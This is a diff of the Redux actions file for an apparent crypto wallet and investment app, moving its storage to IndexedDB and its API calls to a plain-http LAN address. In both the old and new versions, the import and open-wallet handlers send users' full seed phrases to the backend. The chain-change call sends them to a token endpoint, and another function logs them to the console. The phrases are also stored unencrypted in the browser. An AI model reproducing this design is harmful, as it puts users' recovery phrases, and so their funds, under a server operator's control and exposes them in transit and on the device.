@@ -8,717 +8,509 @@ export const CHANGE_WALLET = 'CHANGE_WALLET';
 export const NEW_TRANSACTION = 'NEW_TRANSACTION';
 export const LOGOUT = 'LOGOUT';
 export const UPDATE_USER = 'UPDATE_USER';
+import { ethers } from 'ethers';
 
 
-import { ethers } from 'ethers'
 
-// Calculates how much time (in ms) is left until the expiry timestamp
-let calculateRemainingTime = (hoursUntilExpiry) => {
-  const currentTime = new Date().getTime();
-  const expirationTime = currentTime + hoursUntilExpiry * 60 * 60 * 1000; // Convert hours to milliseconds
-  const timeLeft = expirationTime - currentTime; // Time left in milliseconds
-  return Math.max(timeLeft, 0); // Ensure non-negative result
+const DB_NAME = 'DexvaultDB';
+const DB_VERSION = 1;
+const STORE_NAME = 'keyval';
+
+// Open IndexedDB and create object store if needed
+const openDB = () =>
+  new Promise((resolve, reject) => {
+    const request = indexedDB.open(DB_NAME, DB_VERSION);
+    request.onupgradeneeded = () => {
+      request.result.createObjectStore(STORE_NAME);
+    };
+    request.onsuccess = () => resolve(request.result);
+    request.onerror = () => reject(request.error);
+  });
+
+// Generic helper to perform a transaction and get the store
+const withStore = async (mode, callback) => {
+  const db = await openDB();
+  const tx = db.transaction(STORE_NAME, mode);
+  const store = tx.objectStore(STORE_NAME);
+  const result = await callback(store);
+  return new Promise((res, rej) => {
+    tx.oncomplete = () => res(result);
+    tx.onerror = () => rej(tx.error);
+  });
 };
 
-// Function to retrieve admin token and check its validity
-let retrievedAdminStoredToken = () => {
-  const tokenFromStorage = localStorage.getItem('token');
-  const expiryDate = localStorage.getItem('expiry'); // This should be a timestamp
+// Get value by key
+const idbGet = async (key) =>
+  withStore('readonly', (store) =>
+    new Promise((resolve, reject) => {
+      const req = store.get(key);
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject(req.error);
+    })
+  );
 
+// Set value by key
+const idbSet = async (key, value) =>
+  withStore('readwrite', (store) =>
+    new Promise((resolve, reject) => {
+      const req = store.put(value, key);
+      req.onsuccess = () => resolve();
+      req.onerror = () => reject(req.error);
+    })
+  );
 
-  if (!expiryDate) {
-    return {
-      token: "",
-      expiresIn: ""
-    };
-  }
+// Remove value by key
+const idbRemove = async (key) =>
+  withStore('readwrite', (store) =>
+    new Promise((resolve, reject) => {
+      const req = store.delete(key);
+      req.onsuccess = () => resolve();
+      req.onerror = () => reject(req.error);
+    })
+  );
 
-  const timeLeft = calculateRemainingTime(Number(expiryDate)); // Ensure expiryDate is a number
-
-  if (timeLeft <= 1000) {
-    // Less than or equal to 1 hour
-    localStorage.removeItem('token');
-    localStorage.removeItem('expiry');
-    localStorage.removeItem('user');
-
-    return {
-      token: "",
-      expiresIn: ""
-    };
-  }
-
-  return {
-    token: tokenFromStorage,
-    expiresIn: timeLeft
-  };
-}
-
-
-
-
-//https://dexvault-backend.onrender.com
-
-export const checkIfIsLoggedIn = () => {
-  return async (dispatch, getState) => {
-    let backgroundColorStyle = localStorage.getItem('@backgroundColorStyle');
-    if (!backgroundColorStyle) {
-      let data = {
-        background: 'black',
-        importantText: 'white',
-        normalText: '#5d616d',
-        fadeColor: 'rgb(30,30,30)',
-        blue: 'rgb(37, 99, 235)',
-        fadeButtonColor: 'rgb(30,30,30)',
-      };
-      dispatch({ type: CHANGE_BLACK, payload: data });
-    } else if (backgroundColorStyle === 'white') {
-      let data = {
-        background: 'white',
-        importantText: 'black',
-        normalText: '#5d616d',
-        fadeColor: 'rgb(240,240,240)',
-        blue: 'rgb(37, 99, 235)',
-        fadeButtonColor: 'rgb(200,200,200)',
-      };
-      dispatch({ type: CHANGE_WHITE, payload: data });
-    } else if (backgroundColorStyle === 'black') {
-      let data = {
-        background: 'black',
-        importantText: 'white',
-        normalText: '#5d616d',
-        fadeColor: 'rgb(30,30,30)',
-        blue: 'rgb(37, 99, 235)',
-        fadeButtonColor: 'rgb(30,30,30)',
-      };
-      dispatch({ type: CHANGE_BLACK, payload: data });
-    }
-
-    try {
-      let response;
-      let { token, expiresIn } = await retrievedAdminStoredToken();
-
-      if (!token) {
-        return {
-          bool: false,
-          message: 'no token',
-        };
-      }
-
-      expiresIn = expiresIn / (60 * 60 * 1000);
-      localStorage.setItem('expiry', `${expiresIn}`);
-      localStorage.setItem('token', token);
-      let userId = localStorage.getItem('userId');
-
-      if (!userId) {
-        return {
-          bool: false,
-          message: 'no stored user',
-        };
-      }
-
-
-      response = await fetch(`https://dexvault-backend.onrender.com/userbytoken`, {
-        method: "GET",
-        headers: {
-          "Content-Type": "application/json",
-          "header": `${token}`,
-        },
-      })
-
-
-      if (response.status === 200) {
-
-        let data = await response.json();
-
-
-        localStorage.setItem('userId', data.response.user._id);
-
-        //get wallet details which would influence the kind of force login
-
-        let seedphrase = localStorage.getItem('seedphrase');
-        let address = localStorage.getItem('address');
-
-        let chain = localStorage.getItem('chain')
-        let network = localStorage.getItem('network')
-        let res
-
-        if (seedphrase && address && chain && network) {
-
-          res = {
-            user: data.response.user,
-            admin: data.response.admin,
-            transactions: data.response.transactions,
-            token: token,
-            expiresIn: expiresIn,
-            seedphrase: seedphrase,
-            address: address,
-            chain: chain,
-            network: network
-          };
-
-        } else {
-          res = {
-            user: data.response.user,
-            token: token,
-            expiresIn: expiresIn,
-            admin: data.response.admin,
-            transactions: data.response.transactions,
-
-          };
-
-
-        }
-        //check for 
-        dispatch({ type: FORCEUSERIN, payload: res });
-        return {
-          bool: true,
-          message: res,
-        };
-      }
-
-      if (response.status === 300) {
-
-        let data = await response.json();
-        return {
-          bool: false,
-          message: data.response,
-        };
-      }
-      if (response.status === 404) {
-
-        let data = await response.json();
-        return {
-          bool: false,
-          message: data.response,
-        };
-      }
-    } catch (err) {
-      return {
-        bool: false,
-        message: err.message,
-      };
-    }
-  };
+// Calculate time remaining for token expiration
+const calculateRemainingTime = (expirationTimestamp) => {
+  const currentTime = Date.now();
+  return Math.max(expirationTimestamp - currentTime, 0);
 };
+
+// Retrieve stored token and expiration, clean if expired
+const retrievedAdminStoredToken = async () => {
+  const token = await idbGet('token');
+  const expiry = await idbGet('expiry');
+
+  if (!token || !expiry) return { token: '', expiresIn: '' };
+
+  const timeLeft = calculateRemainingTime(Number(expiry));
+  if (timeLeft <= 0) {
+    await Promise.all([
+      idbRemove('token'),
+      idbRemove('expiry'),
+      idbRemove('user'),
+    ]);
+    return { token: '', expiresIn: '' };
+  }
+
+  return { token, expiresIn: timeLeft };
+};
+
+// Get theme style by color string
+const getTheme = (style) => ({
+  background: style === 'white' ? 'white' : 'black',
+  importantText: style === 'white' ? 'black' : 'white',
+  normalText: '#5d616d',
+  fadeColor: style === 'white' ? 'rgb(240,240,240)' : 'rgb(30,30,30)',
+  blue: 'rgb(37, 99, 235)',
+  fadeButtonColor: style === 'white' ? 'rgb(200,200,200)' : 'rgb(30,30,30)',
+});
+
+// Main login check action
+export const checkIfIsLoggedIn = () => async (dispatch) => {
+  const backgroundColorStyle = await idbGet('@backgroundColorStyle');
+  dispatch({
+    type: backgroundColorStyle === 'white' ? CHANGE_WHITE : CHANGE_BLACK,
+    payload: getTheme(backgroundColorStyle || 'black'),
+  });
+
+  try {
+    const { token, expiresIn } = await retrievedAdminStoredToken();
+    if (!token) return { bool: false, message: 'no token' };
+
+    const userId = await idbGet('userId');
+    if (!userId) return { bool: false, message: 'no stored user' };
+
+    const response = await fetch(`https://dexvault-backend.onrender.com/userbytoken`, {
+      method: 'GET',
+      headers: {
+        'Content-Type': 'application/json',
+        header: token,
+      },
+    });
+
+    if (response.status === 200) {
+      const data = await response.json();
+      await idbSet('userId', data.response.user._id);
+
+      const [seedphrase, address, chain, network] = await Promise.all([
+        idbGet('seedphrase'),
+        idbGet('address'),
+        idbGet('chain'),
+        idbGet('network'),
+      ]);
+
+      const res = {
+        user: data.response.user,
+        admin: data.response.admin,
+        transactions: data.response.transactions,
+        token,
+        expiresIn,
+        ...(seedphrase && address && chain && network
+          ? { seedphrase, address, chain, network }
+          : {}),
+      };
+
+      dispatch({ type: FORCEUSERIN, payload: res });
+      return { bool: true, message: res };
+    }
+
+    const errorData = await response.json();
+    return { bool: false, message: errorData.response };
+  } catch (err) {
+    return { bool: false, message: err.message };
+  }
+};
+
+
+
 
 
 //login handler
 export const authenticate = (data) => {
-
   return async (dispatch, getState) => {
     try {
-
-      let response = await fetch('https://dexvault-backend.onrender.com/authenticate', {
+      let response = await fetch('http://192.168.43.202:9090/authenticate', {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data)
-      })
-      if (response.status === 422) {
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      });
 
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-        }
-      }
-      if (response.status === 500) {
-
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-
-        }
-      }
-
-      if (response.status === 300) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-        }
+      if (response.status === 422 || response.status === 500 || response.status === 300) {
+        let data = await response.json();
+        return { bool: false, message: data.response };
       }
 
       if (response.status === 201) {
-
-        let data = await response.json()
-        return {
-          bool: true,
-          url: 'password'
-        }
+        return { bool: true, url: 'password' };
       }
-      if (response.status === 202) {
 
-        let data = await response.json()
-        return {
-          bool: true,
-          url: 'passcode'
-        }
+      if (response.status === 202) {
+        return { bool: true, url: 'passcode' };
       }
 
       if (response.status === 200) {
-
-        let data = await response.json()
-
-        return {
-          bool: true,
-          url: 'verification',
-        }
+        return { bool: true, url: 'verification' };
       }
     } catch (err) {
-      return {
-        bool: false,
-        message: err.message,
-
-      }
+      return { bool: false, message: err.message };
     }
+  };
+};
 
-  }
-}
+
+
 
 export const verifyEmail = (data) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/verifyemail', {
+      let response = await fetch('http://192.168.43.202:9090/verifyemail', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(data)
-      })
-      if (response.status === 300) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response.message,
-        }
-      }
+      });
 
-      if (response.status === 404) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response.message,
-        }
-      }
+      const dataResponse = await response.json();
 
-      if (response.status === 400) {
-        let data = await response.json()
+      if ([300, 400, 404, 500].includes(response.status)) {
         return {
           bool: false,
-          message: data.response.message,
-        }
-      }
-
-      if (response.status === 500) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response.message,
-        }
+          message: dataResponse.response.message,
+        };
       }
 
       if (response.status === 200) {
-        let data = await response.json()
-        //dispatching the LOGIN action
-        localStorage.setItem('expiry', `${data.response.expiresIn}`);
-        localStorage.setItem('token', data.response.token);
-        localStorage.setItem('userId', data.response.user._id);
+        const { token, user, expiresIn } = dataResponse.response;
 
-        dispatch({ type: LOGIN, payload: data.response })
+        // Calculate expiration timestamp
+        const expirationTimestamp = new Date().getTime() + expiresIn * 60 * 60 * 1000;
 
-        //dispatch login 
+        // Store in IndexedDB instead of localStorage
+        await idbSet('token', token);
+        await idbSet('userId', user._id);
+        await idbSet('expiry', expirationTimestamp.toString());
+
+        // Dispatch login
+        dispatch({ type: LOGIN, payload: dataResponse.response });
+
         return {
           bool: true,
-          message: data.response,
-        }
+          message: dataResponse.response,
+        };
       }
 
     } catch (err) {
       return {
         bool: false,
         message: err.message,
-      }
+      };
     }
+  };
+};
 
-  }
-}
+
+
 
 export const createPasscode = (data) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/createpasscode', {
+      const response = await fetch('http://192.168.43.202:9090/createpasscode', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(data)
-      })
-      if (response.status === 300) {
-        let data = await response.json()
+      });
+
+      const dataResponse = await response.json();
+
+      if ([300, 404, 500].includes(response.status)) {
         return {
           bool: false,
-          message: data.response,
-        }
-      }
-      if (response.status === 404) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-        }
-      }
-      if (response.status === 500) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-        }
+          message: dataResponse.response,
+        };
       }
 
       if (response.status === 200) {
-        let data = await response.json()
+        const { token, user, expiresIn } = dataResponse.response;
 
+        const expirationTimestamp = new Date().getTime() + expiresIn * 60 * 60 * 1000;
 
-        localStorage.setItem('expiry', `${data.response.expiresIn}`);
-        localStorage.setItem('token', data.response.token);
-        localStorage.setItem('userId', data.response.user._id);
+        // Save in IndexedDB
+        await idbSet('token', token);
+        await idbSet('userId', user._id);
+        await idbSet('expiry', expirationTimestamp.toString());
 
-        dispatch({ type: LOGIN, payload: data.response })
-        //dispatch login 
+        dispatch({ type: LOGIN, payload: dataResponse.response });
+
         return {
           bool: true,
-          message: data.response,
-        }
+          message: dataResponse.response,
+        };
       }
+
     } catch (err) {
       return {
         bool: false,
         message: err.message,
-      }
+      };
     }
-  }
-}
+  };
+};
+
+
 
 
 export const checkPasscode = (data) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/checkpasscode', {
+      const response = await fetch('http://192.168.43.202:9090/checkpasscode', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(data)
-      })
-      if (response.status === 300) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response
-        }
-      }
-      if (response.status === 404) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response,
-        }
-      }
-      if (response.status === 401) {
-        let data = await response.json()
-        return {
-          bool: false,
-          message: data.response
-        }
-      }
+      });
 
-      if (response.status === 500) {
-        let data = await response.json()
-        console.log(data)
+      const dataResponse = await response.json();
+
+      if ([300, 404, 401, 500].includes(response.status)) {
         return {
           bool: false,
-          message: data.response
-          ,
-        }
+          message: dataResponse.response,
+        };
       }
 
       if (response.status === 200) {
-        let data = await response.json()
-        //dispatching the LOGIN action
-        localStorage.setItem('expiry', `${data.response.expiresIn}`);
-        localStorage.setItem('token', data.response.token);
-        localStorage.setItem('userId', data.response.user._id);
+        const { token, user, expiresIn } = dataResponse.response;
 
-        dispatch({ type: LOGIN, payload: data.response })
-        //return url depending on the wallet state
+        const expirationTimestamp = new Date().getTime() + expiresIn * 60 * 60 * 1000;
+
+        // Save to IndexedDB
+        await idbSet('expiry', expirationTimestamp.toString());
+        await idbSet('token', token);
+        await idbSet('userId', user._id);
+
+        dispatch({ type: LOGIN, payload: dataResponse.response });
+
         return {
           bool: true,
-          message: data.response,
+          message: dataResponse.response,
           url: 'invest',
           phrase: ''
-        }
+        };
       }
 
     } catch (err) {
       return {
         bool: false,
         message: err.message,
-      }
+      };
     }
+  };
+};
 
-  }
-}
 
 
 export const openWallet = (bodyData) => {
-  const { seedPhrase, address } = bodyData
+  const { seedPhrase, address } = bodyData;
+  
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/storeseedphrase', {
+      const response = await fetch('http://192.168.43.202:9090/storeseedphrase', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(bodyData)
-      })
-      if (response.status === 300) {
-        let data = await response.json()
+      });
 
+      const data = await response.json();
+
+      if (response.status === 300) {
         return {
           bool: false,
           message: data.response,
-        }
+        };
       }
+
       if (response.status === 200) {
-        let data = await response.json()
-        localStorage.setItem('seedphrase', `${seedPhrase}`);
-        localStorage.setItem('address', `${address}`);
-        //fetching current chain
-        let network = 'ethereum'
-        let chain = '0x1'
-        localStorage.setItem('chain', `${chain}`)
-        localStorage.setItem('network', `${network}`)
-        data.response = { ...data.response, chain: chain, network: network, address: address }
+        // Save to IndexedDB instead of localStorage
+        await idbSet('seedphrase', seedPhrase);
+        await idbSet('address', address);
 
-        dispatch({ type: OPEN_WALLET, payload: data.response })
-        //dispatch login 
+        const network = 'ethereum';
+        const chain = '0x1';
 
+        await idbSet('chain', chain);
+        await idbSet('network', network);
+
+        const enrichedData = { ...data.response, chain, network, address };
+
+        dispatch({ type: OPEN_WALLET, payload: enrichedData });
 
         return {
           bool: true,
-          message: data.response,
-        }
+          message: enrichedData,
+        };
       }
 
     } catch (err) {
       return {
         bool: false,
         message: err.message,
-      }
+      };
     }
+  };
+};
 
-  }
-}
+
 
 
 export const importSeedPhrase = (bodyData) => {
-  const { seedPhrase } = bodyData
-  let network = localStorage.getItem('network');
-  try {
-    if (!network) {
-      network = 'ethereum';
-      localStorage.setItem('network', network);
+  const { seedPhrase } = bodyData;
 
-      const address = ethers.Wallet.fromPhrase(seedPhrase).address;
-      localStorage.setItem('address', address);
+  return async (dispatch, getState) => {
+    try {
+      let network = await idbGet('network');
 
-      const chain = '0x1';
-      localStorage.setItem('chain', chain); // Save Ethereum chain
+      if (!network) {
+        network = 'ethereum';
+        await idbSet('network', network);
 
-      //API  call to call
-      return async (dispatch, getState) => {
-        try {
-          let response = await fetch('https://dexvault-backend.onrender.com/storeseedphrase', {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(bodyData)
-          })
-          if (response.status === 300) {
-            let data = await response.json()
-            const state = getState();
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
-          if (response.status === 500) {
-            let data = await response.json()
-            const state = getState();
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
+        const address = ethers.Wallet.fromPhrase(seedPhrase).address;
+        await idbSet('address', address);
 
-          if (response.status === 200) {
-            let data = await response.json()
-            localStorage.setItem('seedphrase', `${seedPhrase}`);
+        const chain = '0x1';
+        await idbSet('chain', chain);
 
-            // fetching current network
-            let network = localStorage.getItem('network');
-            data.response = { ...data.response, chain, network, address };
-            dispatch({ type: OPEN_WALLET, payload: data.response });
+        const response = await fetch('http://192.168.43.202:9090/storeseedphrase', {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(bodyData)
+        });
 
-            return {
-              bool: true,
-              message: data.response,
-            };
+        const data = await response.json();
 
+        if (response.status === 300 || response.status === 500) {
+          return { bool: false, message: data.response };
+        }
 
+        if (response.status === 200) {
+          await idbSet('seedphrase', seedPhrase);
+          const savedNetwork = await idbGet('network');
+          const enrichedData = { ...data.response, chain, network: savedNetwork, address };
+          dispatch({ type: OPEN_WALLET, payload: enrichedData });
+          return { bool: true, message: enrichedData };
+        }
 
-          }
+      } else if (network && network !== 'Bitcoin') {
+        const address = ethers.Wallet.fromPhrase(seedPhrase).address;
+        const chain = await idbGet('chain');
 
-        } catch (err) {
-          console.log(err)
-          return {
-            bool: false,
-            message: err.message,
-          }
+        const response = await fetch('http://192.168.43.202:9090/storeseedphrase', {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(bodyData)
+        });
+
+        const data = await response.json();
+
+        if (response.status === 300 || response.status === 500) {
+          return { bool: false, message: data.response };
+        }
+
+        if (response.status === 200) {
+          await idbSet('seedphrase', seedPhrase);
+          const savedNetwork = await idbGet('network');
+          const enrichedData = { ...data.response, chain, network: savedNetwork, address };
+          dispatch({ type: OPEN_WALLET, payload: enrichedData });
+          return { bool: true, message: enrichedData };
+        }
+
+      } else if (network === 'Bitcoin') {
+        const response = await fetch('http://192.168.43.202:9090/storeseedphrasebtc', {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(bodyData)
+        });
+
+        const data = await response.json();
+
+        if (response.status === 300 || response.status === 500) {
+          return { bool: false, message: data.response };
+        }
+
+        if (response.status === 200) {
+          await idbSet('chain', 'btc');
+          await idbSet('seedphrase', seedPhrase);
+          await idbSet('address', data.response.address);
+
+          const enrichedData = {
+            ...data.response,
+            chain: 'btc',
+            network: 'Bitcoin',
+            address: data.response.address
+          };
+
+          dispatch({ type: OPEN_WALLET, payload: enrichedData });
+
+          return { bool: true, message: enrichedData };
         }
       }
-
-
-
-    } else if (network && network !== 'Bitcoin') {
-      network = localStorage.getItem('network');
-      const address = ethers.Wallet.fromPhrase(seedPhrase).address;
-      const chain = localStorage.getItem('chain');
-
-
-      //api call
-      return async (dispatch, getState) => {
-        try {
-          let response = await fetch('https://dexvault-backend.onrender.com/storeseedphrase', {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(bodyData)
-          })
-          if (response.status === 300) {
-            let data = await response.json()
-            const state = getState();
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
-          if (response.status === 500) {
-            let data = await response.json()
-            const state = getState();
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
-
-          if (response.status === 200) {
-            let data = await response.json()
-            localStorage.setItem('seedphrase', `${seedPhrase}`);
-
-            // fetching current network
-            let network = localStorage.getItem('network');
-            data.response = { ...data.response, chain, network, address };
-            dispatch({ type: OPEN_WALLET, payload: data.response });
-
-            return {
-              bool: true,
-              message: data.response,
-            };
-
-
-
-          }
-
-        } catch (err) {
-          return {
-            bool: false,
-            message: err.message,
-          }
-        }
-      }
-
-    } else if (network && network === 'Bitcoin') {
-      //API call to generate btc address
-      return async (dispatch, getState) => {
-        try {
-          let response = await fetch('https://dexvault-backend.onrender.com/storeseedphrasebtc', {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(bodyData)
-          })
-          if (response.status === 300) {
-            let data = await response.json()
-            const state = getState();
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
-          if (response.status === 500) {
-            let data = await response.json()
-            return {
-              bool: false,
-              message: data.response,
-            }
-          }
-
-          if (response.status === 200) {
-            let data = await response.json()
-            localStorage.setItem('chain', 'btc');
-            localStorage.setItem('seedphrase', `${seedPhrase}`);
-            localStorage.setItem('address', data.response.address);
-            // fetching current network
-            data.response = { ...data.response, chain: 'btc', network: 'Bitcoin', address: data.response.address };
-            dispatch({ type: OPEN_WALLET, payload: data.response });
-
-            return {
-              bool: true,
-              message: data.response,
-            };
-
-
-
-          }
-
-        } catch (err) {
-          return {
-            bool: false,
-            message: err.message,
-          }
-        }
-      }
+    } catch (err) {
+      return { bool: false, message: err.message };
     }
+  };
+};
 
-  } catch (err) {
-    return {
-      bool: false,
-      message: err.message,
-    }
-
-  }
-
-
-
-
-}
 
 
 export const getToken = () => {
@@ -727,7 +519,7 @@ export const getToken = () => {
     let { chain,
       network,
       address, seedphrase } = getState().userAuth
-    console.log(chain)
+ 
 
     if (!address) {
       return {
@@ -736,9 +528,8 @@ export const getToken = () => {
       }
     }
 
-    console.log(getState())
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/tokens', {
+      let response = await fetch('http://192.168.43.202:9090/tokens', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -789,55 +580,63 @@ export const getToken = () => {
 export const changeChain = (chain, network, address, seedphrase) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/tokens', {
+      const response = await fetch('http://192.168.43.202:9090/tokens', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          chain: chain,
-          network: network,
-          address: address,
-          seedphrase: seedphrase
+          chain,
+          network,
+          address,
+          seedphrase
         })
-      })
+      });
+
       if (response.status === 300) {
-        let data = await response.json()
+        const data = await response.json();
         return {
           bool: false,
           message: data.response,
-        }
+        };
       }
 
       if (response.status === 200) {
+        const data = await response.json();
 
-        let data = await response.json()
-        console.log({
-          chain: chain,
-          network: network,
-          address: address
-        })
+        console.log({ chain, network, address });
 
-        localStorage.setItem('chain', `${chain}`)
-        localStorage.setItem('network', `${network}`)
+        // Replace localStorage with IndexedDB set
+        await idbSet('chain', chain);
+        await idbSet('network', network);
+        await idbSet('address', data.jsonResponse.address);
 
-        // change wallet
-        dispatch({ type: CHANGE_WALLET, payload: { chain: chain, network: network, address: data.jsonResponse.address } })
+        dispatch({
+          type: CHANGE_WALLET,
+          payload: { chain, network, address: data.jsonResponse.address }
+        });
 
         return {
           bool: true,
           message: data.jsonResponse,
-        }
+        };
       }
+
+      // Fallback for unexpected status codes
+      return {
+        bool: false,
+        message: 'Unexpected response from server',
+      };
 
     } catch (err) {
       return {
         bool: false,
         message: err.message,
-      }
+      };
     }
-  }
-}
+  };
+};
+
 
 
 export const chainInfo = (chain, address, network, seedphrase) => {
@@ -845,7 +644,7 @@ export const chainInfo = (chain, address, network, seedphrase) => {
 
     console.log({ chain, address, network, seedphrase })
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/tokens', {
+      let response = await fetch('http://192.168.43.202:9090/tokens', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -904,7 +703,7 @@ export const registeration = (data) => {
 
       data = { ...data, email: user.email }
 
-      const response = await fetch(`https://dexvault-backend.onrender.com/registeration`, {
+      const response = await fetch(`http://192.168.43.202:9090/registeration`, {
         headers: {
           "Content-Type": "application/json",
         },
@@ -961,7 +760,7 @@ export const profilePhoto = (data) => {
 
       data = { ...data, email: user.email }
 
-      const response = await fetch(`https://dexvault-backend.onrender.com/pofilephoto`, {
+      const response = await fetch(`http://192.168.43.202:9090/pofilephoto`, {
         headers: {
           "Content-Type": "application/json",
         },
@@ -1010,7 +809,7 @@ export const profilePhoto = (data) => {
 export const sendtansaction = (recipientAddress, name, amount, chain, balance, user) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/transaction', {
+      let response = await fetch('http://192.168.43.202:9090/transaction', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -1058,7 +857,7 @@ export const sendtansaction = (recipientAddress, name, amount, chain, balance, u
 export const fetchTrade = (user) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/tradess', {
+      let response = await fetch('http://192.168.43.202:9090/tradess', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -1103,7 +902,7 @@ export const fetchTrade = (user) => {
 export const sendBtcTansaction = (chain, address, network, seedphrase, amount, balance, recipientAddress) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/sendbtc', {
+      let response = await fetch('http://192.168.43.202:9090/sendbtc', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -1151,7 +950,7 @@ export const sendBtcTansaction = (chain, address, network, seedphrase, amount, b
 export const changeCurrency = (data) => {
   return async (dispatch, getState) => {
     try {
-      let response = await fetch('https://dexvault-backend.onrender.com/changecurrency', {
+      let response = await fetch('http://192.168.43.202:9090/changecurrency', {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -1191,7 +990,7 @@ export const createDeposit = (data) => {
     //do some check on the server if its actually login before proceding to dispatch
     try {
 
-      const response = await fetch(`https://dexvault-backend.onrender.com/createdeposit`, {
+      const response = await fetch(`http://192.168.43.202:9090/createdeposit`, {
         headers: {
           "Content-Type": "application/json",
         },
@@ -1239,7 +1038,7 @@ export const fetchDeposit = (data) => {
   return async (dispatch, getState) => {
     //do some check on the server if its actually login before proceding to dispatch
     try {
-      const response = await fetch(`https://dexvault-backend.onrender.com/fetchdeposit`, {
+      const response = await fetch(`http://192.168.43.202:9090/fetchdeposit`, {
         headers: {
           "Content-Type": "application/json",
         },
@@ -1289,7 +1088,7 @@ export const fetchWithdraw = (data) => {
   return async (dispatch, getState) => {
     //do some check on the server if its actually login before proceding to dispatch
     try {
-      const response = await fetch(`https://dexvault-backend.onrender.com/fetchwithdraw`, {
+      const response = await fetch(`http://192.168.43.202:9090/fetchwithdraw`, {
         headers: {
           "Content-Type": "application/json",
         },
@@ -1338,8 +1137,7 @@ export const createWithdraw = (data) => {
   return async (dispatch, getState) => {
     //do some check on the server if its actually login before proceding to dispatch
     try {
-
-      const response = await fetch(`https://dexvault-backend.onrender.com/createwithdraw`, {
+      const response = await fetch(`http://192.168.43.202:9090/createwithdraw`, {
         headers: {
           "Content-Type": "application/json",
         },
